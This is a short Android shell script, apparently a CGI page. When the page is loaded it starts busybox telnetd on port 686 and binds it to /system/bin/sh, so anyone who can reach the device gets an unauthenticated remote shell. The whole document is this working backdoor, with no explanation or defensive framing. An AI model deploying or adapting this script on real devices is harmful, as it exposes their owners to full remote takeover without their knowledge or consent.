#!/system/bin/sh
echo "Content-type: text/html"
echo ""

port="686"
echo "<h1>Starting Telnetd on port $port</h2>"
echo "<pre>"
/system/bin/busybox telnetd -p $port -l /system/bin/sh
echo "</pre>"
